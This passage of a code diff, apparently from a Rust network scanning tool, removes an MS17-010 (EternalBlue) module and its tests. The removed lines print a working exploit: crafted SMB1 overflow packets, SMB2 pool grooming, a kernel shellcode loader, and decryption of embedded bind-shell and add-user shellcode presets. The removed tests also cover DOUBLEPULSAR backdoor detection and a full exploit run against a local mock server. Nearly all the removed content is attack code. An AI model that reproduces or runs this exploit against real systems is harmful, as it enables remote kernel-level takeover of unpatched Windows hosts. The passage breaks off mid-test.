-            &body[MS17010_EXPLOIT_BODY_FIRST_CHUNK..MS17010_EXPLOIT_BODY_SECOND_END],
-        )?;
-    }
-
-    for stream in groom_streams {
-        let _ = stream.shutdown(std::net::Shutdown::Both);
-    }
-
-    Ok(())
-}
-
-fn resolve_ms17010_shellcode(spec: &str) -> Result<Vec<u8>> {
-    let normalized = spec.trim();
-    let shellcode = match normalized {
-        "bind" | "add" | "guest" => {
-            let encrypted = embedded_ms17010_preset(normalized).with_context(|| {
-                format!("missing ms17010 preset {normalized} in embedded presets")
-            })?;
-            let mut ciphertext = base64::engine::general_purpose::STANDARD
-                .decode(encrypted)
-                .context("failed to decode embedded ms17010 shellcode")?;
-            let decrypted =
-                Aes128CbcDecryptor::<Aes128>::new_from_slices(MS17010_AES_KEY, MS17010_AES_KEY)
-                    .context("failed to initialize ms17010 shellcode decryptor")?
-                    .decrypt_padded_mut::<Pkcs7>(&mut ciphertext)
-                    .map_err(|_| anyhow::anyhow!("failed to decrypt embedded ms17010 shellcode"))?;
-            decode_ms17010_shellcode_hex(
-                std::str::from_utf8(decrypted)
-                    .context("embedded ms17010 shellcode is not valid utf-8")?,
-            )?
-        }
-        "cs" => Vec::new(),
-        value if value.starts_with("file:") => fs::read(&value[5..])
-            .with_context(|| format!("failed to read ms17010 shellcode file {}", &value[5..]))?,
-        value => decode_ms17010_shellcode_hex(value)?,
-    };
-
-    if shellcode.len() < 10 {
-        anyhow::bail!("invalid ms17010 shellcode: fewer than 10 bytes");
-    }
-
-    Ok(shellcode)
-}
-
-fn embedded_ms17010_preset(name: &str) -> Option<&'static str> {
-    ms17010_presets_asset::MS17010_PRESETS
-        .iter()
-        .find(|(preset, _)| *preset == name)
-        .map(|(_, encoded)| *encoded)
-}
-
-fn decode_ms17010_shellcode_hex(value: &str) -> Result<Vec<u8>> {
-    let normalized = value
-        .chars()
-        .filter(|ch| !ch.is_whitespace())
-        .collect::<String>();
-    hex::decode(&normalized).context("failed to decode ms17010 shellcode hex")
-}
-
-fn ms17010_kernel_user_payload(shellcode: &[u8]) -> Result<Vec<u8>> {
-    let max_shellcode_size =
-        MS17010_PACKET_MAX_LEN - MS17010_PACKET_SETUP_LEN - MS17010_EXPLOIT_LOADER.len() - 2;
-    if shellcode.len() > max_shellcode_size {
-        anyhow::bail!(
-            "ms17010 shellcode exceeds limit: {} > {}",
-            shellcode.len(),
-            max_shellcode_size
-        );
-    }
-
-    let mut payload = Vec::with_capacity(MS17010_EXPLOIT_LOADER.len() + 2 + shellcode.len());
-    payload.extend_from_slice(MS17010_EXPLOIT_LOADER);
-    payload.extend_from_slice(&(shellcode.len() as u16).to_le_bytes());
-    payload.extend_from_slice(shellcode);
-    Ok(payload)
-}
-
-fn smb1_large_buffer(stream: &mut TcpStream, tree_id: [u8; 2], user_id: [u8; 2]) -> Result<()> {
-    let response = smb1_nt_trans_request(tree_id, user_id);
-    write_and_flush(stream, &response)?;
-    let trans_header = read_smb1_packet(stream, "nt trans")?;
-    let tree_id = smb_tree_id(&trans_header)?;
-    let user_id = smb_user_id(&trans_header)?;
-
-    let mut packets = Vec::new();
-    packets.extend_from_slice(&smb1_trans2_exploit_packet(tree_id, user_id, 0, "zero"));
-    for timeout in 1..15 {
-        packets.extend_from_slice(&smb1_trans2_exploit_packet(
-            tree_id, user_id, timeout, "buffer",
-        ));
-    }
-    packets.extend_from_slice(&smb1_echo_packet(tree_id, user_id));
-    write_and_flush(stream, &packets)?;
-    let _ = read_smb1_packet(stream, "large buffer")?;
-    Ok(())
-}
-
-fn smb1_nt_trans_request(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
-    let mut packet = Vec::new();
-    packet.extend_from_slice(&[0x00, 0x00, 0x04, 0x38]);
-    packet.extend_from_slice(b"\xFFSMB");
-    packet.push(0xA0);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x00; 8]);
-    packet.extend_from_slice(&[0x00, 0x00]);
-    packet.extend_from_slice(&tree_id);
-    packet.extend_from_slice(&[0xFF, 0xFE]);
-    packet.extend_from_slice(&user_id);
-    packet.extend_from_slice(&[0x40, 0x00]);
-    packet.push(0x14);
-    packet.extend_from_slice(&[0x01, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x1E, 0x00, 0x00, 0x00]);
-    packet.extend_from_slice(&[0xD0, 0x03, 0x01, 0x00]);
-    packet.extend_from_slice(&[0x1E, 0x00, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x1E, 0x00, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x4B, 0x00, 0x00, 0x00]);
-    packet.extend_from_slice(&[0xD0, 0x03, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x68, 0x00, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x01, 0x00, 0x00, 0x00, 0x00]);
-    packet.extend_from_slice(&[0xEC, 0x03]);
-    packet.extend(std::iter::repeat_n(0u8, 0x1F));
-    packet.push(0x01);
-    packet.extend(std::iter::repeat_n(0u8, 0x03CD));
-    packet
-}
-
-fn smb1_trans2_exploit_packet(
-    tree_id: [u8; 2],
-    user_id: [u8; 2],
-    timeout: usize,
-    kind: &str,
-) -> Vec<u8> {
-    let mut packet = Vec::new();
-    let timeout = timeout * 0x10 + 3;
-
-    packet.extend_from_slice(&[0x00, 0x00, 0x10, 0x35]);
-    packet.extend_from_slice(b"\xFFSMB");
-    packet.push(0x33);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x00; 8]);
-    packet.extend_from_slice(&[0x00, 0x00]);
-    packet.extend_from_slice(&tree_id);
-    packet.extend_from_slice(&[0xFF, 0xFE]);
-    packet.extend_from_slice(&user_id);
-    packet.extend_from_slice(&[0x40, 0x00]);
-    packet.push(0x09);
-    packet.extend_from_slice(&[0x00, 0x00]);
-    packet.extend_from_slice(&[0x00, 0x10]);
-    packet.extend_from_slice(&[0x00, 0x00]);
-    packet.extend_from_slice(&[0x00, 0x00]);
-    packet.extend_from_slice(&[0x00, 0x00]);
-    packet.extend_from_slice(&[0x00, 0x10]);
-    packet.extend_from_slice(&[0x35, 0x00, 0xD0, timeout as u8]);
-    packet.extend_from_slice(&[0x00, 0x00]);
-    packet.extend_from_slice(&[0x00, 0x10]);
-
-    match kind {
-        "exploit" => {
-            packet.extend(std::iter::repeat_n(0x41, 2957));
-            packet.extend_from_slice(&[0x80, 0x00, 0xA8, 0x00]);
-            packet.extend(std::iter::repeat_n(0u8, 0x10));
-            packet.extend_from_slice(&[0xFF, 0xFF]);
-            packet.extend(std::iter::repeat_n(0u8, 0x06));
-            packet.extend_from_slice(&[0xFF, 0xFF]);
-            packet.extend(std::iter::repeat_n(0u8, 0x16));
-            packet.extend_from_slice(&[0x00, 0xF1, 0xDF, 0xFF]);
-            packet.extend(std::iter::repeat_n(0u8, 0x08));
-            packet.extend_from_slice(&[0x20, 0xF0, 0xDF, 0xFF]);
-            packet.extend_from_slice(&[0x00, 0xF1, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
-            packet.extend_from_slice(&[0x60, 0x00, 0x04, 0x10]);
-            packet.extend(std::iter::repeat_n(0u8, 0x04));
-            packet.extend_from_slice(&[0x80, 0xEF, 0xDF, 0xFF]);
-            packet.extend(std::iter::repeat_n(0u8, 0x04));
-            packet.extend_from_slice(&[0x10, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
-            packet.extend_from_slice(&[0x18, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
-            packet.extend(std::iter::repeat_n(0u8, 0x10));
-            packet.extend_from_slice(&[0x60, 0x00, 0x04, 0x10]);
-            packet.extend(std::iter::repeat_n(0u8, 0x0C));
-            packet.extend_from_slice(&[0x90, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
-            packet.extend(std::iter::repeat_n(0u8, 0x08));
-            packet.extend_from_slice(&[0x80, 0x10]);
-            packet.extend(std::iter::repeat_n(0u8, 0x0E));
-            packet.extend_from_slice(&[0x39, 0xBB]);
-            packet.extend(std::iter::repeat_n(0x41, 965));
-        }
-        "zero" => {
-            packet.extend(std::iter::repeat_n(0u8, 2055));
-            packet.extend_from_slice(&[0x83, 0xF3]);
-            packet.extend(std::iter::repeat_n(0x41, 2039));
-        }
-        _ => packet.extend(std::iter::repeat_n(0x41, 4096)),
-    }
-
-    packet
-}
-
-fn smb1_echo_packet(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
-    let mut packet = Vec::new();
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x31]);
-    packet.extend_from_slice(b"\xFFSMB");
-    packet.push(0x2B);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x00; 8]);
-    packet.extend_from_slice(&[0x00, 0x00]);
-    packet.extend_from_slice(&tree_id);
-    packet.extend_from_slice(&[0xFF, 0xFE]);
-    packet.extend_from_slice(&user_id);
-    packet.extend_from_slice(&[0x40, 0x00]);
-    packet.extend_from_slice(&[0x01, 0x01, 0x00, 0x0C, 0x00]);
-    packet.extend_from_slice(b"AAAAAAAAAAA\0");
-    packet
-}
-
-fn smb1_free_hole(target: &OpenService, timeout: Duration, start: bool) -> Result<TcpStream> {
-    let mut stream = connect_stream(target, timeout)?;
-    write_and_flush(&mut stream, &ms17010_negotiate_request())?;
-    let _ = read_ms17010_response(&mut stream, "free hole negotiate")?;
-
-    write_and_flush(&mut stream, &smb1_free_hole_session_packet(start))?;
-    let _ = read_smb1_packet(&mut stream, "free hole session")?;
-    Ok(stream)
-}
-
-fn smb1_free_hole_session_packet(start: bool) -> Vec<u8> {
-    let (flags2, vc_num, native_os) = if start {
-        (
-            [0x07, 0xC0],
-            [0x2D, 0x01],
-            vec![0xF0, 0xFF, 0x00, 0x00, 0x00],
-        )
-    } else {
-        (
-            [0x07, 0x40],
-            [0x2C, 0x01],
-            vec![0xF8, 0x87, 0x00, 0x00, 0x00],
-        )
-    };
-
-    let mut packet = Vec::new();
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x51]);
-    packet.extend_from_slice(b"\xFFSMB");
-    packet.push(0x73);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18]);
-    packet.extend_from_slice(&flags2);
-    packet.extend_from_slice(&[0x00, 0x00]);
-    packet.extend_from_slice(&[0x00; 8]);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0x00, 0x00, 0x40, 0x00]);
-    packet.push(0x0C);
-    packet.extend_from_slice(&[0xFF, 0x00, 0x00, 0x00, 0x04, 0x11, 0x0A, 0x00]);
-    packet.extend_from_slice(&vc_num);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x00, 0x00]);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x80]);
-    packet.extend_from_slice(&[0x16, 0x00]);
-    packet.extend_from_slice(&native_os);
-    packet.extend(std::iter::repeat_n(0u8, 17));
-    packet
-}
-
-fn smb2_grooms(target: &OpenService, timeout: Duration, count: usize) -> Result<Vec<TcpStream>> {
-    let mut streams = Vec::with_capacity(count);
-    for _ in 0..count {
-        let mut stream = connect_stream(target, timeout)?;
-        write_and_flush(&mut stream, MS17010_SMB2_GROOM_HEADER)?;
-        streams.push(stream);
-    }
-    Ok(streams)
-}
-
-fn smb2_body(payload: &[u8]) -> Vec<u8> {
-    let packet_max_payload = MS17010_PACKET_MAX_LEN - MS17010_PACKET_SETUP_LEN;
-    let mut body = Vec::new();
-    body.extend(std::iter::repeat_n(0u8, 0x08));
-    body.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]);
-    body.extend(std::iter::repeat_n(0u8, 0x1C));
-    body.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]);
-    body.extend(std::iter::repeat_n(0u8, 0x74));
-    body.extend_from_slice(&[0xB0, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
-    body.extend_from_slice(&[0xB0, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
-    body.extend(std::iter::repeat_n(0u8, 0x10));
-    body.extend_from_slice(&[0xC0, 0xF0, 0xDF, 0xFF]);
-    body.extend_from_slice(&[0xC0, 0xF0, 0xDF, 0xFF]);
-    body.extend(std::iter::repeat_n(0u8, 0xC4));
-    body.extend_from_slice(&[0x90, 0xF1, 0xDF, 0xFF]);
-    body.extend(std::iter::repeat_n(0u8, 0x04));
-    body.extend_from_slice(&[0xF0, 0xF1, 0xDF, 0xFF]);
-    body.extend(std::iter::repeat_n(0u8, 0x40));
-    body.extend_from_slice(&[0xF0, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
-    body.extend(std::iter::repeat_n(0u8, 0x08));
-    body.extend_from_slice(&[0x00, 0x02, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
-    body.push(0x00);
-    body.extend_from_slice(payload);
-    body.extend(std::iter::repeat_n(
-        0u8,
-        packet_max_payload.saturating_sub(payload.len()),
-    ));
-    body
-}
-
-fn oracle_login(
-    target: &OpenService,
-    username: &str,
-    password: &str,
-    service_name: &str,
-    timeout_secs: u64,
-    as_sysdba: bool,
-) -> Result<bool> {
-    let timeout = Duration::from_secs(timeout_secs.max(1));
-    let runtime = tokio::runtime::Builder::new_current_thread()
-        .enable_all()
-        .build()
-        .context("failed to build oracle runtime")?;
-
-    runtime.block_on(async {
-        let mut config =
-            OracleConfig::new(&target.host, target.port, service_name, username, password)
-                .connect_timeout(timeout);
-        if as_sysdba {
-            config = config.with_sysdba();
-        }
-        match tokio::time::timeout(timeout, OracleConnection::connect_with_config(config)).await {
-            Ok(Ok(connection)) => {
-                let _ = tokio::time::timeout(timeout, connection.close()).await;
-                Ok(true)
-            }
-            Ok(Err(_)) | Err(_) => Ok(false),
-        }
-    })
-}
-
-fn read_ms17010_response(stream: &mut TcpStream, stage: &str) -> Result<Vec<u8>> {
-    let mut response = vec![0u8; 4096];
-    let size = stream
-        .read(&mut response)
-        .with_context(|| format!("failed to read {stage} response"))?;
-    if size < 36 {
-        anyhow::bail!("{stage} response too short");
-    }
-    response.truncate(size);
-    Ok(response)
-}
-
-fn read_smb1_packet(stream: &mut TcpStream, stage: &str) -> Result<Vec<u8>> {
-    let mut netbios = [0u8; 4];
-    stream
-        .read_exact(&mut netbios)
-        .with_context(|| format!("failed to read {stage} netbios header"))?;
-    if netbios[0] != 0x00 {
-        anyhow::bail!("invalid {stage} netbios message type: 0x{:02x}", netbios[0]);
-    }
-    let length =
-        ((netbios[1] as usize) << 16) | ((netbios[2] as usize) << 8) | (netbios[3] as usize);
-    let mut body = vec![0u8; length];
-    stream
-        .read_exact(&mut body)
-        .with_context(|| format!("failed to read {stage} smb body"))?;
-    let mut packet = Vec::with_capacity(4 + body.len());
-    packet.extend_from_slice(&netbios);
-    packet.extend_from_slice(&body);
-    Ok(packet)
-}
-
-fn smb_status_code(response: &[u8]) -> Result<u32> {
-    let bytes: [u8; 4] = response
-        .get(9..13)
-        .context("missing smb status code")?
-        .try_into()
-        .context("invalid smb status code length")?;
-    Ok(u32::from_le_bytes(bytes))
-}
-
-fn smb_user_id(response: &[u8]) -> Result<[u8; 2]> {
-    response
-        .get(32..34)
-        .context("missing smb user id")?
-        .try_into()
-        .context("invalid smb user id length")
-}
-
-fn smb_tree_id(response: &[u8]) -> Result<[u8; 2]> {
-    response
-        .get(28..30)
-        .context("missing smb tree id")?
-        .try_into()
-        .context("invalid smb tree id length")
-}
-
-fn parse_ms17010_os(response: &[u8]) -> String {
-    let Some(session) = response.get(36..) else {
-        return String::new();
-    };
-    if session.first().copied().unwrap_or_default() == 0 || session.len() < 10 {
-        return String::new();
-    }
-    let byte_count = u16::from_le_bytes([session[7], session[8]]) as usize;
-    if response.len() != byte_count + 45 {
-        return String::new();
-    }
-    let end = session[10..]
-        .windows(2)
-        .position(|window| window == [0, 0])
-        .map(|index| index + 10)
-        .unwrap_or(session.len());
-    let bytes = session[10..end]
-        .iter()
-        .copied()
-        .filter(|byte| *byte != 0)
-        .collect::<Vec<_>>();
-    String::from_utf8_lossy(&bytes).trim().to_string()
-}
-
-fn ms17010_negotiate_request() -> Vec<u8> {
-    hex::decode(MS17010_NEGOTIATE_REQUEST_HEX).expect("valid MS17010 negotiate request")
-}
-
-fn ms17010_session_setup_request() -> Vec<u8> {
-    hex::decode(MS17010_SESSION_SETUP_REQUEST_HEX).expect("valid MS17010 session setup request")
-}
-
-fn ms17010_tree_connect_request(host: &str, user_id: [u8; 2]) -> Vec<u8> {
-    let ipc_path = format!(r"\\{}\IPC$", host);
-    let byte_count = 1 + ipc_path.len() + 1 + 6;
-    let mut packet = Vec::new();
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
-    packet.extend_from_slice(b"\xFFSMB");
-    packet.push(0x75);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00]);
-    packet.extend_from_slice(&[0x00; 8]);
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x2F, 0x4B]);
-    packet.extend_from_slice(&user_id);
-    packet.extend_from_slice(&[0xC5, 0x5E]);
-    packet.extend_from_slice(&[0x04, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00]);
-    packet.extend_from_slice(&(byte_count as u16).to_le_bytes());
-    packet.push(0x00);
-    packet.extend_from_slice(ipc_path.as_bytes());
-    packet.push(0x00);
-    packet.extend_from_slice(b"?????\0");
-    let length = (packet.len() - 4) as u32;
-    packet[1..4].copy_from_slice(&length.to_be_bytes()[1..4]);
-    packet
-}
-
-fn ms17010_trans_named_pipe_request() -> Vec<u8> {
-    hex::decode(MS17010_TRANS_NAMED_PIPE_REQUEST_HEX)
-        .expect("valid MS17010 trans named pipe request")
-}
-
-fn ms17010_trans2_session_setup_request() -> Vec<u8> {
-    hex::decode(MS17010_TRANS2_SESSION_SETUP_REQUEST_HEX)
-        .expect("valid MS17010 trans2 session setup request")
-}
-
 fn parse_findnet_payload(payload: &[u8]) -> Option<(String, Vec<String>, Vec<String>)> {
     let marker = payload
         .windows(FINDNET_END_MARKER.len())
@@ -5320,7 +4638,7 @@ mod tests {
     use std::io::{BufReader, ErrorKind};
     use std::net::{TcpListener, UdpSocket};
     use std::path::PathBuf;
-    use std::sync::{Arc, Mutex};
+    use std::sync::Arc;
     use std::thread;
 
     const TEST_SSH_PRIVATE_KEY: &str = "-----BEGIN OPENSSH PRIVATE KEY-----\n\
@@ -5535,35 +4853,6 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
         assert_eq!(findings[0].plugin, "ftp");
         assert_eq!(findings[0].status, "anonymous-login");
         assert_eq!(findings[0].details["username"], json!("anonymous"));
-    }
-
-    #[test]
-    fn skips_ms17010_when_brute_force_disabled() {
-        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
-        let port = listener.local_addr().expect("local addr").port();
-        drop(listener);
-
-        set_auth_runtime_options(AuthRuntimeOptions {
-            disable_brute: true,
-            ..AuthRuntimeOptions::default()
-        });
-        let findings = scan_services(
-            &[OpenService {
-                host: "127.0.0.1".to_string(),
-                port,
-            }],
-            "ms17010",
-            &PluginContext {
-                usernames: Vec::new(),
-                passwords: Vec::new(),
-                timeout_secs: 1,
-                ssh_key_path: None,
-            },
-        )
-        .expect("scan should succeed");
-        set_auth_runtime_options(AuthRuntimeOptions::default());
-
-        assert!(findings.is_empty());
     }
 
     #[test]
@@ -7705,327 +6994,6 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
     }
 
     #[test]
-    fn detects_ms17010_vulnerability() {
-        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
-        let port = listener.local_addr().expect("local addr").port();
-
-        let server = thread::spawn(move || {
-            let (mut stream, _) = listener.accept().expect("request should arrive");
-
-            let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
-            stream
-                .read_exact(&mut negotiate)
-                .expect("negotiate should read");
-            assert_eq!(negotiate, ms17010_negotiate_request());
-            stream
-                .write_all(&ms17010_negotiate_response())
-                .expect("negotiate response should write");
-
-            let mut session = vec![0u8; ms17010_session_setup_request().len()];
-            stream
-                .read_exact(&mut session)
-                .expect("session should read");
-            assert_eq!(session, ms17010_session_setup_request());
-            let user_id = [0x34, 0x12];
-            stream
-                .write_all(&ms17010_session_response(user_id, "Windows Server 2012 R2"))
-                .expect("session response should write");
-
-            let mut tree = vec![0u8; ms17010_tree_connect_request("127.0.0.1", user_id).len()];
-            stream.read_exact(&mut tree).expect("tree should read");
-            assert_eq!(tree, ms17010_tree_connect_request_for("127.0.0.1", user_id));
-            let tree_id = [0x78, 0x56];
-            stream
-                .write_all(&ms17010_tree_response(tree_id))
-                .expect("tree response should write");
-
-            let mut pipe = vec![0u8; ms17010_trans_named_pipe_request().len()];
-            stream
-                .read_exact(&mut pipe)
-                .expect("named pipe should read");
-            assert_eq!(pipe, ms17010_trans_named_pipe_request_for(tree_id, user_id));
-            stream
-                .write_all(&ms17010_named_pipe_response(true))
-                .expect("named pipe response should write");
-
-            let mut trans2 = vec![0u8; ms17010_trans2_session_setup_request().len()];
-            stream.read_exact(&mut trans2).expect("trans2 should read");
-            assert_eq!(
-                trans2,
-                ms17010_trans2_session_setup_request_for(tree_id, user_id)
-            );
-            stream
-                .write_all(&ms17010_backdoor_response(true))
-                .expect("backdoor response should write");
-        });
-
-        let findings = scan_services(
-            &[OpenService {
-                host: "127.0.0.1".to_string(),
-                port,
-            }],
-            "ms17010",
-            &PluginContext {
-                usernames: Vec::new(),
-                passwords: Vec::new(),
-                timeout_secs: 2,
-                ssh_key_path: None,
-            },
-        )
-        .expect("scan should succeed");
-
-        server.join().expect("server should finish");
-
-        assert_eq!(findings.len(), 1);
-        assert_eq!(findings[0].plugin, "ms17010");
-        assert_eq!(findings[0].status, "vulnerable");
-        assert_eq!(findings[0].details["vulnerability"], json!("MS17-010"));
-        assert_eq!(findings[0].details["backdoor"], json!("DOUBLEPULSAR"));
-        assert_eq!(findings[0].details["os"], json!("Windows Server 2012 R2"));
-    }
-
-    #[test]
-    fn resolves_ms17010_bind_shellcode_preset() {
-        let shellcode = resolve_ms17010_shellcode("bind").expect("bind preset should resolve");
-        assert!(shellcode.len() > 10);
-    }
-
-    #[test]
-    fn rejects_ms17010_cs_preset_as_invalid_shellcode() {
-        let error = resolve_ms17010_shellcode("cs").expect_err("cs preset should be invalid");
-        assert!(error.to_string().contains("invalid ms17010 shellcode"));
-    }
-
-    #[test]
-    fn attempts_ms17010_exploit_when_shellcode_requested() {
-        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
-        let port = listener.local_addr().expect("local addr").port();
-        let payload_capture = Arc::new(Mutex::new(Vec::new()));
-        let capture = Arc::clone(&payload_capture);
-
-        let server = thread::spawn(move || {
-            let (mut detect_stream, _) =
-                listener.accept().expect("detect connection should arrive");
-
-            let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
-            detect_stream
-                .read_exact(&mut negotiate)
-                .expect("negotiate should read");
-            assert_eq!(negotiate, ms17010_negotiate_request());
-            detect_stream
-                .write_all(&ms17010_negotiate_response())
-                .expect("negotiate response should write");
-
-            let mut session = vec![0u8; ms17010_session_setup_request().len()];
-            detect_stream
-                .read_exact(&mut session)
-                .expect("session should read");
-            assert_eq!(session, ms17010_session_setup_request());
-            let user_id = [0x34, 0x12];
-            detect_stream
-                .write_all(&ms17010_session_response(user_id, "Windows Server 2012 R2"))
-                .expect("session response should write");
-
-            let mut tree = vec![0u8; ms17010_tree_connect_request("127.0.0.1", user_id).len()];
-            detect_stream
-                .read_exact(&mut tree)
-                .expect("tree should read");
-            assert_eq!(tree, ms17010_tree_connect_request_for("127.0.0.1", user_id));
-            let tree_id = [0x78, 0x56];
-            detect_stream
-                .write_all(&ms17010_tree_response(tree_id))
-                .expect("tree response should write");
-
-            let mut pipe = vec![0u8; ms17010_trans_named_pipe_request().len()];
-            detect_stream
-                .read_exact(&mut pipe)
-                .expect("named pipe should read");
-            assert_eq!(pipe, ms17010_trans_named_pipe_request_for(tree_id, user_id));
-            detect_stream
-                .write_all(&ms17010_named_pipe_response(true))
-                .expect("named pipe response should write");
-
-            let mut trans2 = vec![0u8; ms17010_trans2_session_setup_request().len()];
-            detect_stream
-                .read_exact(&mut trans2)
-                .expect("trans2 should read");
-            assert_eq!(
-                trans2,
-                ms17010_trans2_session_setup_request_for(tree_id, user_id)
-            );
-            detect_stream
-                .write_all(&ms17010_backdoor_response(true))
-                .expect("backdoor response should write");
-            drop(detect_stream);
-
-            let (mut exploit_stream, _) =
-                listener.accept().expect("exploit connection should arrive");
-            let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
-            exploit_stream
-                .read_exact(&mut negotiate)
-                .expect("exploit negotiate should read");
-            assert_eq!(negotiate, ms17010_negotiate_request());
-            exploit_stream
-                .write_all(&ms17010_negotiate_response())
-                .expect("exploit negotiate response should write");
-
-            let mut session = vec![0u8; ms17010_session_setup_request().len()];
-            exploit_stream
-                .read_exact(&mut session)
-                .expect("exploit session should read");
-            assert_eq!(session, ms17010_session_setup_request());
-            exploit_stream
-                .write_all(&ms17010_session_response(user_id, "Windows Server 2012 R2"))
-                .expect("exploit session response should write");
-
-            let mut tree = vec![0u8; ms17010_tree_connect_request("127.0.0.1", user_id).len()];
-            exploit_stream
-                .read_exact(&mut tree)
-                .expect("exploit tree should read");
-            assert_eq!(tree, ms17010_tree_connect_request_for("127.0.0.1", user_id));
-            exploit_stream
-                .write_all(&ms17010_tree_response(tree_id))
-                .expect("exploit tree response should write");
-
-            let nt_trans = read_netbios_message(&mut exploit_stream).expect("nt trans should read");
-            assert_eq!(nt_trans[8], 0xA0);
-            exploit_stream
-                .write_all(&ms17010_framed_response(0xA0, tree_id, user_id, &[]))
-                .expect("nt trans response should write");
-
-            for index in 0..15 {
-                let trans =
-                    read_netbios_message(&mut exploit_stream).expect("trans2 packet should read");
-                assert_eq!(trans[8], 0x33);
-                if index == 0 {
-                    assert_eq!(
-                        trans.len(),
-                        smb1_trans2_exploit_packet(tree_id, user_id, 0, "zero").len()
-                    );
-                }
-            }
-            let echo = read_netbios_message(&mut exploit_stream).expect("echo should read");
-            assert_eq!(echo[8], 0x2B);
-            exploit_stream
-                .write_all(&ms17010_framed_response(0x2B, tree_id, user_id, &[]))
-                .expect("echo response should write");
-
-            let (mut free_hole_start, _) =
-                listener.accept().expect("free hole start should arrive");
-            let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
-            free_hole_start
-                .read_exact(&mut negotiate)
-                .expect("free hole start negotiate should read");
-            free_hole_start
-                .write_all(&ms17010_negotiate_response())
-                .expect("free hole start negotiate response should write");
-            let free_hole_start_packet = read_netbios_message(&mut free_hole_start)
-                .expect("free hole start packet should read");
-            assert_eq!(free_hole_start_packet[8], 0x73);
-            free_hole_start
-                .write_all(&ms17010_framed_response(
-                    0x73,
-                    [0x00, 0x00],
-                    [0x00, 0x00],
-                    &[],
-                ))
-                .expect("free hole start response should write");
-
-            let mut groom_streams = Vec::new();
-            for _ in 0..MS17010_EXPLOIT_INITIAL_GROOMS {
-                let (mut groom, _) = listener.accept().expect("groom should arrive");
-                let mut header = vec![0u8; MS17010_SMB2_GROOM_HEADER.len()];
-                groom
-                    .read_exact(&mut header)
-                    .expect("groom header should read");
-                assert_eq!(header, MS17010_SMB2_GROOM_HEADER);
-                groom_streams.push(groom);
-            }
-
-            let (mut free_hole_end, _) = listener.accept().expect("free hole end should arrive");
-            let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
-            free_hole_end
-                .read_exact(&mut negotiate)
-                .expect("free hole end negotiate should read");
-            free_hole_end
-                .write_all(&ms17010_negotiate_response())
-                .expect("free hole end negotiate response should write");
-            let free_hole_end_packet =
-                read_netbios_message(&mut free_hole_end).expect("free hole end packet should read");
-            assert_eq!(free_hole_end_packet[8], 0x73);
-            free_hole_end
-                .write_all(&ms17010_framed_response(
-                    0x73,
-                    [0x00, 0x00],
-                    [0x00, 0x00],
-                    &[],
-                ))
-                .expect("free hole end response should write");
-
-            for _ in 0..MS17010_EXPLOIT_SECOND_GROOMS {
-                let (mut groom, _) = listener.accept().expect("second groom should arrive");
-                let mut header = vec![0u8; MS17010_SMB2_GROOM_HEADER.len()];
-                groom
-                    .read_exact(&mut header)
-                    .expect("second groom header should read");
-                assert_eq!(header, MS17010_SMB2_GROOM_HEADER);
-                groom_streams.push(groom);
-            }
-
-            let final_packet =
-                read_netbios_message(&mut exploit_stream).expect("final packet should read");
-            assert_eq!(final_packet[8], 0x33);
-            exploit_stream
-                .write_all(&ms17010_framed_response(0x33, tree_id, user_id, &[]))
-                .expect("final response should write");
-
-            for (index, mut groom) in groom_streams.into_iter().enumerate() {
-                let mut first = vec![0u8; MS17010_EXPLOIT_BODY_FIRST_CHUNK];
-                groom
-                    .read_exact(&mut first)
-                    .expect("first groom payload should read");
-                let mut second =
-                    vec![0u8; MS17010_EXPLOIT_BODY_SECOND_END - MS17010_EXPLOIT_BODY_FIRST_CHUNK];
-                groom
-                    .read_exact(&mut second)
-                    .expect("second groom payload should read");
-                if index == 0 {
-                    let mut captured = first;
